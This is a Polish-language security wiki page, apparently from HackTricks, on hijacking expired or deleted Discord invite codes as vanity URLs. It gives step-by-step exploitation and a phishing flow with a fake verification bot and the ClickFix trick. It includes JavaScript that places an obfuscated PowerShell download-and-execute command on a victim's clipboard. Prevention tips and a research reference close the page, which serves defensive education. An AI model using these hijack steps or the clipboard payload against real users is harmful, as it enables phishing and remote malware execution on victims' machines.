# Przejęcie zaproszeń Discord

{{#include ../../banners/hacktricks-training.md}}

Luka w systemie zaproszeń Discord pozwala threat actors przejmować wygasłe lub usunięte kody zaproszeń (tymczasowe, stałe lub niestandardowe vanity) jako nowe vanity links na dowolnym serwerze z Level 3 Boost. Ponieważ wszystkie kody są normalizowane do małych liter, attackers mogą wcześniej zarejestrować znane kody zaproszeń i po cichu przejąć ruch, gdy pierwotny link wygaśnie lub serwer źródłowy utraci Boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Typy zaproszeń i ryzyko przejęcia

| Typ zaproszenia           | Możliwe do przejęcia? | Warunek / Uwagi                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Tymczasowy link zaproszenia | ✅          | Po wygaśnięciu kod staje się dostępny i może zostać ponownie zarejestrowany jako vanity URL przez serwer z Boost. |
| Stały link zaproszenia | ⚠️          | Jeśli zostanie usunięty i składa się wyłącznie z małych liter oraz cyfr, kod może ponownie stać się dostępny.        |
| Niestandardowy vanity link    | ✅          | Jeśli pierwotny serwer utraci Level 3 Boost, jego vanity invite stanie się dostępne do ponownej rejestracji.    |

## Kroki exploitacji

1. Rozpoznanie
- Monitoruj publiczne źródła (fora, media społecznościowe, kanały Telegram) w poszukiwaniu linków zaproszeń pasujących do wzorca `discord.gg/{code}` lub `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Zbieraj interesujące kody zaproszeń (tymczasowe lub vanity).
2. Wstępna rejestracja
- Utwórz serwer Discord z uprawnieniami Level 3 Boost lub użyj już istniejącego.
- W **Server Settings → Vanity URL** spróbuj przypisać docelowy kod zaproszenia. Jeśli zostanie zaakceptowany, kod zostanie zarezerwowany przez malicious server.
3. Aktywacja przejęcia
- W przypadku zaproszeń tymczasowych poczekaj, aż pierwotne zaproszenie wygaśnie (lub usuń je ręcznie, jeśli kontrolujesz źródło).
- W przypadku kodów zawierających wielkie litery wariant zapisany małymi literami może zostać przejęty natychmiast, jednak przekierowanie aktywuje się dopiero po wygaśnięciu.
4. Ciche przekierowanie
- Użytkownicy odwiedzający stary link zostaną płynnie przekierowani na serwer kontrolowany przez attackera, gdy przejęcie stanie się aktywne.

## Phishing Flow via Discord Server

1. Ogranicz kanały serwera tak, aby widoczny był wyłącznie kanał **#verify**.<sup>[[1]](#references)</sup>
2. Wdróż bota (np. **Safeguard#0786**), aby prosił nowych użytkowników o weryfikację za pomocą OAuth2.
3. Bot przekierowuje użytkowników do phishing site (np. `captchaguard.me`) pod pretekstem CAPTCHA lub etapu weryfikacji.
4. Zaimplementuj trik UX **ClickFix**:
- Wyświetl komunikat o uszkodzonej CAPTCHA.
- Nakłoń użytkowników do otwarcia okna **Win+R**, wklejenia wstępnie załadowanej komendy PowerShell i naciśnięcia Enter.

### Przykład wstrzyknięcia do schowka ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
To podejście pozwala uniknąć bezpośredniego pobierania plików i wykorzystuje znane elementy interfejsu użytkownika, aby zmniejszyć podejrzliwość użytkownika.<sup>[[1]](#references)</sup>

## Sposoby zapobiegania

- Używaj stałych linków zaproszeń zawierających co najmniej jedną wielką literę lub znak niealfanumeryczny (nigdy nie wygasają i nie można ich ponownie użyć).<sup>[[1]](#references)</sup>
- Regularnie zmieniaj kody zaproszeń i unieważniaj stare linki.
- Monitoruj status boostowania serwera Discord oraz przejęcia vanity URL.
- Edukuj użytkowników, aby weryfikowali autentyczność serwera i unikali wykonywania poleceń wklejanych ze schowka.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
